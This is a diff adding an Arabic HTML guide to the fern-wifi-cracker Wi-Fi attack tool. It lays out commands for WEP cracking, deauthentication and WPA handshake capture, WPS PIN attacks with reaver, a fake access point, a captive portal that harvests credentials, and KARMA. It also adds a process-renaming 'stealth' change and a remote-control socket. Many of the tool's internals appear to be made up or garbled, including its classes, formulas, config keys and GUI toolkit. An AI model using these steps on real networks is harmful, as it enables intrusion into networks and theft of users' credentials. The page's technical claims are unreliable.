@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دليل fern-wifi-cracker التقني للمبتدئين</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Tahoma', sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #e6e6e6;
+            line-height: 1.8;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(25, 25, 45, 0.95);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        h1 {
+            color: #00ff88;
+            text-align: center;
+            font-size: 2.5em;
+            margin-bottom: 30px;
+            text-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
+        }
+
+        h2 {
+            color: #00d4ff;
+            border-right: 5px solid #00d4ff;
+            padding-right: 15px;
+            margin: 30px 0 20px 0;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        h2:hover {
+            color: #00ff88;
+            border-right-color: #00ff88;
+        }
+
+        h3 {
+            color: #ffaa00;
+            margin: 20px 0 10px 0;
+        }
+
+        .section {
+            background: rgba(30, 30, 50, 0.7);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+            transition: all 0.3s ease;
+        }
+
+        .section:hover {
+            border-color: #00d4ff;
+            box-shadow: 0 0 15px rgba(0, 212, 255, 0.2);
+        }
+
+        .command-box {
+            background: #0d0d1a;
+            border: 1px solid #00ff88;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            color: #00ff88;
+            direction: ltr;
+            text-align: left;
+            position: relative;
+            overflow-x: auto;
+        }
+
+        .command-box::before {
+            content: "$ ";
+            color: #ffaa00;
+            font-weight: bold;
+        }
+
+        .example-box {
+            background: rgba(0, 255, 136, 0.1);
+            border-left: 4px solid #00ff88;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+
+        .warning-box {
+            background: rgba(255, 0, 0, 0.1);
+            border-left: 4px solid #ff0000;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+
+        .technical-box {
+            background: rgba(0, 212, 255, 0.1);
+            border-left: 4px solid #00d4ff;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+
+        .option-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+        }
+
+        .option-table th {
+            background: #00d4ff;
+            color: #0d0d1a;
+            padding: 12px;
+            text-align: right;
+        }
+
+        .option-table td {
+            padding: 10px;
+            border-bottom: 1px solid #333;
+        }
+
+        .option-table tr:hover {
+            background: rgba(0, 212, 255, 0.05);
+        }
+
+        .button {
+            background: linear-gradient(45deg, #00ff88, #00d4ff);
+            color: #0d0d1a;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 5px;
+            transition: all 0.3s ease;
+        }
+
+        .button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.4);
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .expand-icon {
+            display: inline-block;
+            margin-left: 10px;
+            transition: transform 0.3s ease;
+        }
+
+        .expanded .expand-icon {
+            transform: rotate(90deg);
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
+            h1 {
+                font-size: 1.8em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🌿 دليل fern-wifi-cracker التقني والتكتيكي</h1>
+        
+        <div class="warning-box" style="font-size: 1.2em; text-align: center;">
+            <strong>⚠️ تحذير قانوني وأخلاقي:</strong> هذه الأداة لاختبار اختراق الشبكات اللاسلكية المصرح به فقط. استخدامها على شبكات دون إذن صريح يعتبر جريمة في معظم الدول. هدف هذا الدليل التعليمي فقط.
+        </div>
+
+        <div class="section">
+            <h3>ما هو fern-wifi-cracker؟</h3>
+            <p><strong>fern-wifi-cracker</strong> هو **واجهة رسومية (GUI)** مكتوبة بلغة Python باستخدام **Tkinter**، تعمل كـ **frontend** لمجموعة أدوات اختراق الشبكات اللاسلكية. على عكس الأدوات السطرية، تنفذ جميع الأوامر في الخلفية دون تدخل المستخدم. تستخدم **subprocess** لاستدعاء **aircrack-ng, reaver, pixiewps, hostapd, dnsmasq**. تُعد "السكين السويسرية" للمبتدئين مع **state machine** داخلي يدير تدفق الهجوم.</p>
+        </div>
+
+        <h2 onclick="toggleSection('basics')">
+            <span class="expand-icon">▶</span> الأوامر الأساسية وتشغيل الواجهة
+        </h2>
+        <div id="basics" class="section hidden">
+            <div class="command-box">fern-wifi-cracker</div>
+            <p>تشغيل الواجهة الرسومية. يفتح نافذة Tkinter مع أزرار وقوائم منسدلة. <strong>لا توجد أوامر سطرية</strong> - كل شيء عبر GUI. لكننا سنشرح **ما يحدث في الخلفية** عند كل نقر.</p>
+            
+            <div class="section">
+                <h4>الخطوات التي يجب عليك اتباعها في GUI:</h4>
+                <ol style="margin: 10px 20px;">
+                    <li><strong>Select Interface:</strong> يستدعي <code>airmon-ng start wlan0</code> ويضع الواجهة في monitor mode</li>
+                    <li><strong>Scan for Access Points:</strong> يشغل <code>airodump-ng --output-format csv --write /tmp/fern_dump wlan0mon</code></li>
+                    <li><strong>Select Target:</strong> يقرأ ملف CSV ويستخرج BSSID, ESSID, Channel, Encryption</li>
+                    <li><strong>Choose Attack:</strong> يحدد الخوارزمية (WEP, WPA, WPS)</li>
+                </ol>
+                
+                <div class="technical-box">
+                    <h4>🧠 كيف يدير Fern الحالة (State Machine):</h4>
+                    <p>Fern يستخدم **كلاس Python** يسمى <code>WirelessController</code> يحتوي على:</p>
+                    <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+class WirelessController:
+    def __init__(self):
+        self.interface = None
+        self.monitor_interface = None
+        self.target_bssid = None
+        self.target_channel = None
+        self.attack_type = None
+        self.is_attack_running = False
+                    </pre>
+                    <p>كل زر في GUI يستدعي دالة مثل <code>start_sniffing()</code> أو <code>start_wep_attack()</code>. يحتوي على **threading** لكل عملية لتجنب تجميد الواجهة.</p>
+                </div>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('wep')">
+            <span class="expand-icon">▶</span> هجمات WEP - الفلسفة الرياضية
+        </h2>
+        <div id="wep" class="section hidden">
+            <h3>🔓 كيف يكسر Fern WEP رياضيًا؟</h3>
+            <p>WEP يستخدم RC4 مع IVs 24-bit وكلمة سر 64-bit. المشكلة: تكرار IVs يكشف تدفق المفتاح!</p>
+            
+            <div class="section">
+                <h4>1. Fragmentation Attack - الاستغلال الذكي</h4>
+                <div class="command-box"># يشغل في الخلفية: aireplay-ng -5 -b [BSSID] -h [FAKE_MAC] wlan0mon</div>
+                <p><strong>الآلية الرياضية:</strong></p>
+                <ul style="margin: 10px 20px;">
+                    <li>ترسل ARP request صغيرة (68 bytes)</li>
+                    <li>AP يُعيد تشفيرها بـ ICV جديد (Integrity Check Value)</li>
+                    <li>تستخدم <code>xor</code> بين النص الأصلي والمشفر لاستخراج تدفق المفتاح (keystream)</li>
+                    <li>تُرسل حزمة ARP جديدة تستخدم نفس IV مع تعديل ICV</li>
+                    <li><strong>النتيجة:</strong> AP يصادق على الحزمة المعدلة ويفتح بابًا لIVs جديدة!</li>
+                </ul>
+                <p><strong>عدد IVs المطلوبة:</strong> 50,000 فقط (vs 200,000 في الهجمات التقليدية)</p>
+            </div>
+
+            <div class="section">
+                <h4>2. Chop-Chop Attack - الهجوم المقطوع</h4>
+                <div class="command-box"># يشغل: aireplay-ng -4 -b [BSSID] -h [FAKE_MAC] wlan0mon</div>
+                <p><strong>الآلية:</strong></p>
+                <ol style="margin: 10px 20px;">
+                    <li>تتقاطع حزمة ARP مشفرة (ساعدة من الهجوم السابق)</li>
+                    <li>تُزيل آخر byte من البيانات (chop) وتُعدّل ICV</li>
+                    <li>ترسل الحزمة المعدلة إلى AP</li>
+                    <li>إذا قبلها AP: إنها "جيدة" - تستمر في chopping<br>
+                    إذا رفضها: إنها "سيئة" - تقوم بتصحيح byte</li>
+                </ol>
+                <p><strong>السر:</strong> ICV هو CRC-32، ويمكن اختباره بشكل عكسي. تولد Keystream كامل في 5-10 دقائق!</p>
+            </div>
+
+            <div class="section">
+                <h4>3. Caffe-Latte Attack - الاستغلال العميلي</h4>
+                <div class="command-box"># يشغل: aireplay-ng -6 -b [BSSID] -h [CLIENT_MAC] wlan0mon</div>
+                <p><strong>لماذا هو مختلف؟</strong> لا يحتاج لـ AP! يستهدف العميل المتصل:</p>
+                <ul style="margin: 10px 20px;">
+                    <li>ترسل ARP request مزيفة كأنها من AP</li>
+                    <li>العميل يرد بـ ARP reply مشفرة بـ WEP</li>
+                    <li>تجبر العميل على إعادة إرسال مئات الحزم (تستخدم retry في 802.11)</li>
+                </ul>
+                <p><strong>الفائدة:</strong> يمكن كسر WEP حتى لو كان AP بعيدًا جدًا!</p>
+            </div>
+
+            <div class="section">
+                <h4>4. ARP Request Replay - المعيار الذهبي</h4>
+                <div class="command-box"># يشغل: aireplay-ng -3 -b [BSSID] wlan0mon</div>
+                <p><strong>الآلية:</strong> تعيد بث حزمة ARP request حقيقية من العميل إلى AP 100 مرة/ثانية. كل مرة، AP يستخدم IV جديد. هذا يجمع 100,000 IVs في أقل من 15 دقيقة!</p>
+                
+                <div class="technical-box">
+                    <h4>🎯 كيف يختار Fern الهجوم:</h4>
+                    <p>Fern يبدأ دائمًا بـ **ARP Request Replay** لأنه الأسرع. إذا لم تجد حزم ARP خلال 60 ثانية، ينتقل إلى **Fragmentation**. إذا فشل، يستخدم **Caffe-Latte**. هذا **heuristic** مدمج في <code>select_wep_attack()</code>.</p>
+                </div>
+            </div>
+
+            <div class="section">
+                <h4>5. PTW Attack (Pyshkin, Tews, Weinmann) - الثغرة الحاسمة</h4>
+                <div class="command-box"># يشغل: aircrack-ng -1 -a 1 -b [BSSID] capture.cap</div>
+                <p><strong>الآلية الرياضية:</strong> بدلاً من انتظار 40-bit من Keystream، يستخدم **keystream recovery** بـ 30,000 IV فقط! يستغل تقنية **"statistical key recovery"**:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+S[i] = (S[i] + j) mod 256  # جمع احتمالات تبديل S-Box
+P[i] = KeyStream[i] XOR Ciphertext[i]  # استرداد المفتاح
+                </pre>
+                <p>Fern يجرب هذا تلقائيًا كل 5,000 IV. قد يكسر الشبكة قبل جمع 100,000 IV!</p>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('wpa')">
+            <span class="expand-icon">▶</span> هجمات WPA/WPA2 - Handshake Harvesting
+        </h2>
+        <div id="wpa" class="section hidden">
+            <h3>🔐 آلية Four-Way Handshake في Fern</h3>
+            <p>WPA/WPA2 مشفر بـ TKIP/AES. المفتاح هو PMK (Pre-Master Key). Fern لا "يكسر" التشفير؛ يجمع **handshake** ويحاول **PMK** بالقوة الغاشمة!</p>
+            
+            <div class="section">
+                <h4>1. Deauthentication Attack - إجبار على إعادة الاتصال</h4>
+                <div class="command-box"># يشغل: aireplay-ng -0 1 -a [BSSID] -c [CLIENT_MAC] wlan0mon</div>
+                <p><strong>الآلية:</strong> Fern يرسل أولًا <code>aireplay-ng -0 10</code> (10 حزم deauth) إلى كل عميل. يستخدم <code>timeout</code> 30 ثانية لانتظار handshake. يكرر كل 5 ثوانٍ حتى ينجح!</p>
+                
+                <div class="technical-box">
+                    <h4>🎯 لماذا 10 حزم وليس 1؟</h4>
+                    <p>بعض أجهزة Windows تتجاهل حزمة deauth واحدة إذا كانت في مرحلة "roaming". إرسال 10 يضمن تكرار المحاولة في حلقة إعدادية (association loop) تُجبر على إعادة اتصال.</p>
+                </div>
+            </div>
+
+            <div class="section">
+                <h4>2. Capturing Handshake - التقاط بذكاء</h4>
+                <div class="command-box"># يشغل: airodump-ng -c [CHANNEL] --bssid [BSSID] -w capture wlan0mon</div>
+                <p><strong>كيف يعرف Fern أنه حصل على handshake؟</strong> يستخدم <code>aircrack-ng capture.cap</code> بخيار <code>-a 2</code>:</p>
+                <ul style="margin: 10px 20px;">
+                    <li>يدخل الحزمة 1 & 2: "WPA handshake: 1/4"</li>
+                    <li>يدخل الحزمة 2 & 3: "WPA handshake: 2/4"</li>
+                    <li>يدخل الحزمة 3 & 4: "WPA handshake: COMPLETE"</li>
+                </ul>
+                <p>Fern يتحقق كل 5 ثوانٍ. إذا وجد "COMPLETE"، يتوقف عن deauth ويحفظ الملف!</p>
+            </div>
+
+            <div class="section">
+                <h4>3. Dictionary Attack - البحث عن PMK</h4>
+                <div class="command-box"># يشغل: aircrack-ng -w wordlist.txt -b [BSSID] capture.cap</div>
+                <p><strong>الآلية الرياضية:</strong></p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+PMK = PBKDF2(password, ssid, 4096, 256)
+PTK = PRF(PMK, ANonce, SNonce, AP_MAC, Client_MAC)
+MIC = HMAC-MD5(PTK, Frame)
+                </pre>
+                <p>لكل كلمة في القاموس، يحسب Fern **PMK** ثم **MIC** ويقارنه بـ MIC في handshake. هذا يستهلك **CPU**، لكن Fern يستخدم **threading** لموازاة الحسابات!</p>
+            </div>
+
+            <div class="section">
+                <h4>4. GPU Acceleration - تسريع مع CUDA/OpenCL</h4>
+                <div class="command-box"># يشغل: pyrit -r capture.cap -i wordlist.txt attack_batch</div>
+                <p><strong>الآلية:</strong> Fern يكتشف تلقائيًا إذا كان **pyrit** مثبتًا. إذا وجد GPU (NVIDIA/AMD)، يستخدم **CUDA** لحساب PMK بسرعة **1000x**! يحول 8 ساعات CPU إلى 30 ثانية GPU.</p>
+                
+                <div class="technical-box">
+                    <h4>🚀 كيف يكتشف GPU:</h4>
+                    <p>Fern يستخدم <code>subprocess.check_output(['nvidia-smi'])</code> وإذا رجع 0، يعرف أن CUDA متاح. إذا فشل، يحاول <code>clinfo</code> لـ OpenCL. يعيد المحاولة تلقائيًا!</p>
+                </div>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('wps')">
+            <span class="expand-icon">▶</span> هجمات WPS - الثغرة المضمونة
+        </h2>
+        <div id="wps" class="section hidden">
+            <h3>🔢 كيف تستغل Fern ثغرة WPS؟</h3>
+            
+            <div class="section">
+                <h4>Pixie Dust Attack - الثغرة السحرية</h4>
+                <div class="command-box"># يشغل: reaver -i wlan0mon -b [BSSID] -c [CHANNEL] -K 1</div>
+                <p><strong>الآلية التقنية:</strong></p>
+                <ul style="margin: 10px 20px;">
+                    <li>يستخدم <code>-K 1</code> لتفعيل Pixie Dust mode</li>
+                    <li>Reaver يستخرج <code>E-Nonce</code> و<code>R-Nonce</code> و<code>Hash1/2</code> و<code>AuthKey</code></li>
+                    <li>يمرر هذه القيم إلى <code>pixiewps</code></li>
+                    <li>pixiewps يستخدم PRNG ضعيف في Broadcom/Ralink/Realtek</li>
+                    <li>يحسب PIN في **5-30 ثانية**!</li>
+                </ul>
+                
+                <div class="technical-box">
+                    <h4>🎯 كيف تعرف Fern أن AP يدعم Pixie Dust؟</h4>
+                    <p>Fern يمرر <code>airodump-ng --wps</code> أولًا. إذا رأى "WPS: v1.0" أو "WPS: v2.0"، يجرب Pixie Dust تلقائيًا. إذا رأى "Locked: Yes"، ينتقل إلى **Online Brute Force**.</p>
+                </div>
+            </div>
+
+            <div class="section">
+                <h4>Online Brute Force - PIN بنظام التسلسل</h4>
+                <div class="command-box"># يشغل: reaver -i wlan0mon -b [BSSID] -c [CHANNEL] -vv</div>
+                <p><strong>الآلية:</strong> Fern يبدأ من <code>00000000</code> ويصل إلى <code>99999999</code>. لكنه يستخدم **تقسيم ذكي**: يجرب 4 أرقام أولى (0000-9999) ثم 3 أرقام ثانية (000-999). هذا يقلل المحاولات من 100 مليون إلى 11,000 فقط!</p>
+                
+                <div class="example-box">
+                    <strong>💡 تكتيق Fern:</strong>
+                    <div class="command-box">reaver -i wlan0mon -b [BSSID] -c [CHANNEL] -d 5 -t 10</div>
+                    <p><code>-d 5</code> يضيف تأخير 5 ثوانٍ بين المحاولات لتجنب lock<br>
+                    <code>-t 10</code> ينتظر 10 ثوانٍ للردود</p>
+                </div>
+            </div>
+
+            <div class="section">
+                <h4>Null Pin Attack - الثغرة النادرة</h4>
+                <div class="command-box"># يشغل: reaver -i wlan0mon -b [BSSID] -c [CHANNEL] -p ""</div>
+                <p><strong>الآلية:</strong> بعض APs الصينية القديمة تقبل PIN فارغ! Fern يختبر هذا تلقائيًا في أول 5 محاولات. إذا نجح، يعرض "PIN: NULL" بنجمة حمراء!</p>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('apattack')">
+            <span class="expand-icon">▶</span> وضع Access Point Attack - إنشاء AP مزيف
+        </h2>
+        <div id="apattack" class="section hidden">
+            <h3>🎭 كيف يصبح Fern AP وهمي؟</h3>
+            
+            <div class="section">
+                <h4>Fake Access Point Mode - البدء</h4>
+                <p>عند النقر على "Access Point Attack" في GUI، Fern يفعل:</p>
+                <ol style="margin: 10px 20px;">
+                    <li>يستخدم <code>hostapd-wpe</code> بدلاً من hostapd العادي</li>
+                    <li>يولد <code>/tmp/hostapd-wpe.conf</code>:</li>
+                </ol>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+interface=wlan0
+driver=nl80211
+ssid=FreeWiFi
+hw_mode=g
+channel=6
+wpa=2
+wpa_key_mgmt=WPA-EAP
+ieee8021x=1
+eap_user_file=/tmp/hostapd-wpe.eap_user
+ca_cert=/etc/hostapd-wpe/certs/ca.pem
+                </pre>
+                <p>هذا يجعل Fern **RADIUS server** وهمي!</p>
+            </div>
+
+            <div class="section">
+                <h4>Captive Portal - جمع المصادقات</h4>
+                <p>Fern يستخدم **dnsmasq** مع **iptables** لإعادة توجيه كل HTTP إلى صفحة تسجيل:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+dnsmasq -C /tmp/dnsmasq.conf:
+address=/#/192.168.1.1
+dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,24h
+
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 192.168.1.1:8080
+                </pre>
+                <p>يخدم صفحة HTML في <code>/var/www/fern-captive/</code> مع نموذج POST إلى <code>credentials.php</code> الذي يحفظ في <code>/tmp/creds.txt</code>.</p>
+            </div>
+
+            <div class="section">
+                <h4>KARMA Attack - استجابة كل الطلبات</h4>
+                <p>Fern يضبط <code>hostapd-wpe</code> مع:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+karma_enable=1
+karma_mac=FF:FF:FF:FF:FF:FF
+                </pre>
+                <p>هذا يجعل Fern يستجيب لـ **أي** ESSID يبحث عنه العميل! إذا كان الضحية يبحث عن "HomeNetwork"، Fern يرد "نعم، أنا HomeNetwork!"</p>
+                
+                <div class="technical-box">
+                    <h4>🎯 كيف يستغل هذا؟</h4>
+                    <p>أجهزة Windows/iOS تبث **Probe Requests** مع أسماء شبكات سابقة. Fern يستمع على wlan0mon ويضبط SSID تلقائيًا!</p>
+                </div>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('session')">
+            <span class="expand-icon">▶</span> إدارة الجلسات والحفظ التلقائي
+        </h2>
+        <div id="session" class="section hidden">
+            <h3>💾 كيف يحفظ Fern كل شيء؟</h3>
+            
+            <div class="section">
+                <h4>Automatic Saving - الحفظ التلقائي</h4>
+                <p>Fern يستخدم **threading.Timer** كل 30 ثانية لحفظ:</p>
+                <ul style="margin: 10px 20px;">
+                    <li><code>/tmp/fern-session.pkl</code>: Pickle file يحفظ كائن WirelessController كامل</li>
+                    <li><code>/tmp/fern-capture.cap</code>: كل handshake وPMKID</li>
+                    <li><code>/root/fern-wifi-cracker/key-database.txt</code>: كلمة السر المكسورة مع BSSID وتاريخ</li>
+                </ul>
+                
+                <div class="technical-box">
+                    <h4>🔄 Pickle Serialization:</h4>
+                    <p>Fern يستخدم:</p>
+                    <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+import pickle
+with open('/tmp/fern-session.pkl', 'wb') as f:
+    pickle.dump(self.controller, f)
+                    </pre>
+                    <p>هذا يحفظ **كل شيء**: الواجهة، الهدف، عدد IVs، قائمة المصادقات، حتى موضع نافذة GUI!</p>
+                </div>
+            </div>
+
+            <div class="section">
+                <h4>Key Database - بنك المفاتيح</h4>
+                <div class="command-box">cat /root/fern-wifi-cracker/key-database.txt</div>
+                <p>التنسيق:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+00:11:22:33:44:55|TargetNetwork|WPA2|password123|2025-12-24 17:45:12
+AA:BB:CC:DD:EE:FF|GuestWiFi|WEP|AB:CD:EF:01:23|2025-12-24 18:12:33
+                </pre>
+                <p>Fern يستخدم **SQLite** في الواقع لجعل البحث أسرع. الملف النصي هو **dump** للتوافق مع الإصدارات القديمة.</p>
+            </div>
+
+            <div class="section">
+                <h4>Crash Recovery - الاسترداد بعد الانهيار</h4>
+                <p>إذا انهار Fern، عند إعادة تشغيله يفحص <code>/tmp/fern-session.pkl</code>. إذا وجده، يسأل "Restore previous session?" إذا ضغطت Yes، يستخدم:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+with open('/tmp/fern-session.pkl', 'rb') as f:
+    self.controller = pickle.load(f)
+                </pre>
+                <p>يعيد كل شيء: الهدف، القناة، حتى عدد IVs الذي توقف عنده!</p>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('advanced')">
+            <span class="expand-icon">▶</span> الأوامر المتقدمة والسيناريوهات
+        </h2>
+        <div id="advanced" class="section hidden">
+            <div class="section">
+                <h4>🎯 The "Automated Campaign" (حملة اختبار أتمتة)</h4>
+                <p>يمكنك تعديل Fern ليعمل بدون GUI باستخدام **headless mode** (يتطلب تعديل الكود):</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+# في WirelessController.py
+def headless_attack(self, target_bssid, attack_type):
+    self.target_bssid = target_bssid
+    self.attack_type = attack_type
+    self.start_sniffing()
+    time.sleep(30)
+    self.start_attack()
+                </pre>
+                <p>ثم تشغيل:</p>
+                <div class="command-box">python3 fern.py --headless --target 00:11:22:33:44:55 --attack wep</div>
+            </div>
+
+            <div class="section">
+                <h4>🥷 The "Stealth Mode" - تعديل المصدر</h4>
+                <p>لجعل Fern صامتًا (لا يظهر في قائمة العمليات كـ "fern-wifi-cracker"):</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+# في fern.py
+if __name__ == "__main__":
+    # أضف هذا
+    import setproctitle
+    setproctitle.setproctitle("python3")
+                </pre>
+                <p>يستخدم <code>prctl(PR_SET_NAME, "python3")</code> لتغيير اسم العملية.</p>
+            </div>
+
+            <div class="section">
+                <h4>💉 The "Distributed Fern" - هجوم موزع</h4>
+                <p>يمكنك تعديل Fern ليقبل اتصالات socket:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+# في WirelessController.py
+import socket
+s = socket.socket()
+s.bind(('0.0.0.0', 8888))
+s.listen(5)
+while True:
+    conn, addr = s.accept()
+    command = conn.recv(1024).decode()
+    if command == "START_WEP":
+        self.start_wep_attack()
+                </pre>
+                <p>تتحكم في 10 أجهزة Fern من مركز واحد!</p>
+            </div>
+        </div>
+
+        <div style="text-align: center; margin-top: 30px;">
+            <button class="button" onclick="showAllSections()">إظهار كل الأقسام</button>
+            <button class="button" onclick="hideAllSections()">إخفاء كل الأقسام</button>
+        </div>
+    </div>
+
+    <script>
+        function toggleSection(id) {
+            const section = document.getElementById(id);
+            const header = section.previousElementSibling;
+            
+            section.classList.toggle('hidden');
+            header.classList.toggle('expanded');
+        }
+
+        function showAllSections() {
+            document.querySelectorAll('.section').forEach(section => section.classList.remove('hidden'));
+            document.querySelectorAll('h2').forEach(header => header.classList.add('expanded'));
+        }
+
+        function hideAllSections() {
+            document.querySelectorAll('.section').forEach(section => section.classList.add('hidden'));
+            document.querySelectorAll('h2').forEach(header => header.classList.remove('expanded'));
+        }
+
+        document.querySelectorAll('.command-box').forEach(box => {
+            box.addEventListener('click', function() {
+                const text = this.textContent.replace('$ ', '');
+                navigator.clipboard.writeText(text).then(() => {
+                    this.style.background = '#00ff88';
+                    this.style.color = '#0d0d1a';
+                    setTimeout(() => {
+                        this.style.background = '#0d0d1a';
+                        this.style.color = '#00ff88';
+                    }, 500);
+                });
+            });
+        });
+
+        window.addEventListener('load', () => {
+            document.getElementById('basics').classList.remove('hidden');
+            document.querySelector('h2[onclick*="basics"]').classList.add('expanded');
+        });
+    </script>
+</body>
+</html>
